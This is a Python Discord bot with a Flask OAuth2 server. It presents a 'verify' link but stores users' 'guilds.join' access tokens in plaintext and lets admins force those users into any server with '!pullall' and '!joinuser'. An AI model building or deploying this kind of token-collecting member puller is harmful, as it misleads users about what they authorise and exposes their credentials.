import os
import json
import requests
import threading
import logging

from flask import Flask, request
import discord
from discord.ext import commands

# === ENV VARIABLES ===
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CLIENT_ID = os.environ.get("CLIENT_ID")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")

# === LOGGING ===
logging.basicConfig(level=logging.INFO)

# === FLASK SETUP ===
app = Flask(__name__)

def save_token(user_id, token_data):
    try:
        with open("tokens.json", "r") as f:
            data = json.load(f)
    except:
        data = {}

    data[str(user_id)] = token_data
    with open("tokens.json", "w") as f:
        json.dump(data, f, indent=4)

@app.route("/")
def home():
    return "✅ Discord bot and OAuth2 server running."

@app.route("/oauth/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "Missing code", 400

    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify guilds.join"
    }

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    res = requests.post("https://discord.com/api/oauth2/token", data=payload, headers=headers)
    if res.status_code != 200:
        return f"Failed to exchange code: {res.text}", 400

    token_data = res.json()

    user_info = requests.get("https://discord.com/api/users/@me", headers={
        "Authorization": f"Bearer {token_data['access_token']}"
    }).json()

    save_token(user_info["id"], token_data)

    return f"✅ {user_info['username']} verified successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# === DISCORD BOT SETUP ===
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def load_tokens():
    try:
        with open("tokens.json", "r") as f:
            return json.load(f)
    except:
        return {}

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

@bot.command()
async def verify(ctx):
    auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code&scope=identify%20guilds.join"
    )
    try:
        await ctx.author.send(f"Click this link to verify: {auth_url}")
        await ctx.send("📬 Check your DMs!")
    except discord.Forbidden:
        await ctx.send("❌ I can't DM you. Please enable DMs.")

@bot.command()
@commands.has_permissions(administrator=True)
async def pullall(ctx):
    guild_id = ctx.guild.id
    tokens = load_tokens()
    if not tokens:
        await ctx.send("❌ No users have verified.")
        return

    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }

    success = []
    failed = []

    for user_id, token_data in tokens.items():
        json_data = {
            "access_token": token_data["access_token"]
        }

        r = requests.put(
            f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}",
            headers=headers,
            json=json_data
        )

        if r.status_code in (201, 204):
            success.append(f"<@{user_id}>")
        else:
            failed.append(f"<@{user_id}> ({r.status_code})")

    result_msg = ""
    if success:
        result_msg += f"✅ Pulled {len(success)} users:\n" + "\n".join(success) + "\n\n"
    if failed:
        result_msg += f"❌ Failed to pull {len(failed)} users:\n" + "\n".join(failed)

    await ctx.send(result_msg)


@bot.command()
@commands.has_permissions(administrator=True)
async def joinuser(ctx, user_id: int, guild_id: int):
    tokens = load_tokens()
    token_data = tokens.get(str(user_id))
    if not token_data:
        await ctx.send("❌ User not verified.")
        return

    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }

    json_data = {
        "access_token": token_data["access_token"]
    }

    r = requests.put(
        f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}",
        headers=headers,
        json=json_data
    )

    if r.status_code in (201, 204):
        await ctx.send(f"✅ <@{user_id}> added to server.")
    else:
        await ctx.send(f"❌ Failed: {r.status_code} - {r.text}")

@bot.command()
@commands.has_permissions(administrator=True)
async def listverified(ctx):
    tokens = load_tokens()
    if not tokens:
        await ctx.send("No verified users.")
        return

    users = "\n".join([f"<@{uid}>" for uid in tokens.keys()])
    await ctx.send(f"Verified Users:\n{users}")

# === MAIN ===
if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.run(BOT_TOKEN)
